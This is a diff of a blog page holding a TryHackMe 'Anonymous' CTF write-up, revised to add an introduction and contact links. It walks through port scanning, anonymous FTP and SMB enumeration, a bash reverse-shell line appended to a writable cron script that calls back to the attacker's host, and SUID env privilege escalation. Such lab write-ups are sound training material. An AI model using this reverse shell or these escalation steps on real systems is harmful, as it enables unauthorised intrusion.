@@ -5,9 +5,8 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:Siva Rajendran]">
-<meta name="description" content="Scanning and Enumeration of the network nmap -sC -sV -sS -oA res -p1-65535 10.10.237.45
-masscan -p1-65535 10.10.237.45 &amp;ndash;rate=1000 -e tun0
-┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CESTNmap scan report for 10.10.237.45Host is up (0.069s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 19:26 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10." />
+<meta name="description" content="The following write up is for the machine: Anonymous
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
@@ -44,12 +43,11 @@ masscan -p1-65535 10.10.237.45 &amp;ndash;rate=1000 -e tun0
 
 
 <meta itemprop="name" content="Tryhackme- Anonymous Writeup">
-<meta itemprop="description" content="Scanning and Enumeration of the network nmap -sC -sV -sS -oA res -p1-65535 10.10.237.45
-masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0
-┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CESTNmap scan report for 10.10.237.45Host is up (0.069s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 19:26 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.">
+<meta itemprop="description" content="The following write up is for the machine: Anonymous
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.">
 <meta itemprop="datePublished" content="2020-09-01T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2020-09-01T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1334">
+<meta itemprop="wordCount" content="1536">
 <meta itemprop="image" content="https://0xSh1v4.github.io"/>
 
 
@@ -60,16 +58,14 @@ masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0
 <meta name="twitter:image" content="https://0xSh1v4.github.io"/>
 
 <meta name="twitter:title" content="Tryhackme- Anonymous Writeup"/>
-<meta name="twitter:description" content="Scanning and Enumeration of the network nmap -sC -sV -sS -oA res -p1-65535 10.10.237.45
-masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0
-┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CESTNmap scan report for 10.10.237.45Host is up (0.069s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 19:26 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10."/>
+<meta name="twitter:description" content="The following write up is for the machine: Anonymous
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas."/>
 
 
 
     <meta property="og:title" content="Tryhackme- Anonymous Writeup" />
-<meta property="og:description" content="Scanning and Enumeration of the network nmap -sC -sV -sS -oA res -p1-65535 10.10.237.45
-masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0
-┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]└─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CESTNmap scan report for 10.10.237.45Host is up (0.069s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 19:26 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10." />
+<meta property="og:description" content="The following write up is for the machine: Anonymous
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/" />
 <meta property="og:image" content="https://0xSh1v4.github.io"/>
@@ -148,7 +144,7 @@ masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        7 minutes reading time
+        8 minutes reading time
 
         
       </p>
@@ -162,9 +158,12 @@ masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0
       
 
       <div class="post-content">
-        <h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
-<p>nmap -sC -sV -sS -oA res -p1-65535 10.10.237.45</p>
-<p>masscan -p1-65535 10.10.237.45 &ndash;rate=1000 -e tun0</p>
+        <p>The following write up is for the machine: Anonymous</p>
+<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><em>Anonymous</em> is the typical boot2root machine where we need to find two flags in the machine. It comes with an interesting part that explains the exploitation via FTP server to get the reverse shell by which we can obtain a user flag.And the privilege escalation done via weak SUID permissions by which we will obtain our root flag.</p>
+<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
+<p>As usual, let us run the nmap tool to can the target network.</p>
 <pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
 └─$ sudo nmap -sC -sV -sS -oA res 10.10.237.45 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 17:07 CEST
@@ -220,7 +219,8 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
-</code></pre><p>From the results, we could see anonymous ftp login is allowed. So let&rsquo;s find what infos do we get from there.</p>
+</code></pre><p>From the results, we could see an allowance via anonymous ftp login and also the smb ports are open.</p>
+<p>So let&rsquo;s find what infos do we get from there.</p>
 <figure>
     <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/1.png"
          alt="Tryhacme: Anonymous machine - Download from FTP server"/> <figcaption>
@@ -229,10 +229,10 @@ Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
 </figure>
 
 <p>Now, we have downloaded these files. lets inspect it.</p>
-<p>I haven&rsquo;t found anything interesting so far.</p>
-<p>I ran enum4linux since we found some smb port 139 and 445.</p>
-<p><a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/</a></p>
-<p>From the results of enum4linux, we found that anonymous smbshare accessiblity is possible.</p>
+<p>Now, I have downloaded these files. lets inspect it. (<strong>This is the part which learned from this machine</strong>)
+I found a bash script (clean.sh) which runs at regular intervals.
+I also ran <em>enum4linux</em> since I found some smb port 139 and 445.</p>
+<p>Read this nice article about SMB Enumeration: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">SMB-Enumeration</a></p>
 <pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Anonymous]
 └─$ enum4linux -a 10.10.237.45                                                                         130 ⨯
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 27 17:22:06 2020
@@ -432,21 +432,22 @@ No printers returned.
 
 
 enum4linux complete on Thu Aug 27 17:29:05 2020
-</code></pre><p>From the results, we found the local users info and also anonymous smb access was available.</p>
-<p>ANONYMOUS\nobody
-ANONYMOUS\none
-ANONYMOUS\namelessone</p>
-<p>we have linked to this folder and downloaded the files
+</code></pre><p>From the results of <em>enum4linux</em>, I found that anonymous smbshare accessiblity is possible. But there were only image files and doesn&rsquo;t help us much.</p>
 <figure>
     <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/2.png"
          alt="Tryhackme: Anonymous machine - Download from SMB Share"/> <figcaption>
             <p>Tryhackme: Anonymous machine - Download from SMB Share</p>
         </figcaption>
 </figure>
-</p>
-<p>But have&rsquo;t found anything so far.</p>
+
+<p>Also, we have found the local users names from <em>enum4linux</em>.</p>
+<ul>
+<li>ANONYMOUS\nobody</li>
+<li>ANONYMOUS\none</li>
+<li>ANONYMOUS\namelessone</li>
+</ul>
 <h2 id="exploitation-of-the-network">Exploitation of the network</h2>
-<p>After looking into the hint, It strikes me that we have full write permission on FTP and it is possible to upload our shell and get an access to the machine.</p>
+<p>After looking the results again, It striked me that we have a full write permission on clean.sh script which runs repeatedly and it is possible to upload our shell and get an access to the machine.</p>
 <p>we have full write permission on clean.sh file.
 <figure>
     <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/3.png"
@@ -457,7 +458,7 @@ ANONYMOUS\namelessone</p>
 </p>
 <p>So, we have append our shell script to the file</p>
 <p><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.90.133/1234 0&gt;&amp;1'</code></p>
-<p>And now we got our rev shell back.</p>
+<p>And now we got our rev shell back connecting to the target machine.</p>
 <figure>
     <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/4.png"
          alt="Tryhackme: Anonymous machine - Low level shell with the user namelessone"/> <figcaption>
@@ -496,9 +497,9 @@ find / -perm -u=s -type f 2&gt;/dev/null
 /usr/bin/sudo
 /usr/bin/traceroute6.iputils
 /usr/bin/at
-</code></pre><p>The user namelessone has the ENV with SUID bit set.</p>
+</code></pre><p>The user namelessone has the <strong>ENV</strong> with <em>SUID</em> bit set.</p>
 <p>So. we can use it to elevate our privilege
-<code>https://gtfobins.github.io/gtfobins/env/</code></p>
+<a href="https://gtfobins.github.io/gtfobins/env/">GTFOBINS-ENV</a></p>
 <figure>
     <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/5.png"
          alt="Tryhackme: Anonymous machine - Privilege Escalation to Root"/> <figcaption>
@@ -507,6 +508,21 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </figure>
 
 <p>And that&rsquo;s how we have got our root flag.</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="https://0xSh1v4.github.io/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
 
       </div>
     </article>
@@ -523,7 +539,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1334 Words
+        1536 Words
       </p>
 
       <p>
